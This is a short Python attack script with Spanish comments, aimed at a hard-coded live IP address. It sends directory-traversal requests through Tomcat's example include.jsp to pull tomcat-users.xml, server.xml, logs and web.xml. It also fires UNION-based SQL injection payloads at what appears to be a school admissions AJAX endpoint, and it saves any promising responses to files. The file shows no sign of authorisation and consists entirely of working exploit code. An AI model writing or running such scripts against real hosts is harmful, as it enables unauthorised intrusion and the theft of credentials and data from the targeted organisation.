#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "https://189.254.143.102"
verify_ssl = False  # Ignorar errores de certificado

# Probar Directory Traversal
paths = [
    "/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml",
    "/examples/jsp/include/include.jsp?page=../../../../conf/server.xml", 
    "/examples/jsp/include/include.jsp?page=../../../../logs/catalina.out",
    "/examples/jsp/include/include.jsp?page=../../../../webapps/SITO/WEB-INF/web.xml"
]

print("[+] Probando Directory Traversal por HTTPS...")
for path in paths:
    try:
        response = requests.get(f"{target}{path}", verify=verify_ssl, timeout=10)
        print(f"\n[+] {path}")
        print(f"    Status: {response.status_code}")
        print(f"    Tamaño: {len(response.text)}")
        
        if "tomcat" in response.text.lower() or "server" in response.text.lower():
            print("    [POSIBLE ÉXITO] Contenido de configuración encontrado!")
            filename = f"success_{path.split('/')[-1].split('?')[0]}.txt"
            with open(filename, "w") as f:
                f.write(response.text)
    except Exception as e:
        print(f"    Error: {e}")

# Probar SQLi en endpoint AJAX
print("\n[+] Probando SQLi en endpoint AJAX...")
sqli_payloads = [
    "1' UNION SELECT 1,user(),database(),version()--",
    "1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--",
    "1' AND 1=0 UNION SELECT 1,@@version,3,4--"
]

ajax_url = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"

for payload in sqli_payloads:
    try:
        full_url = f"{target}{ajax_url}?xCveBachillerato={payload}"
        response = requests.get(full_url, verify=verify_ssl, timeout=10)
        print(f"\n[+] Payload: {payload}")
        print(f"    Status: {response.status_code}")
        print(f"    Tamaño: {len(response.text)}")
        
        if response.status_code == 200 and len(response.text) > 50:
            print("    [RESPUESTA DIFERENTE] Posible SQLi exitoso!")
            with open(f"sqli_ajax_{payload[:10]}.txt", "w") as f:
                f.write(response.text)
    except Exception as e:
        print(f"    Error: {e}")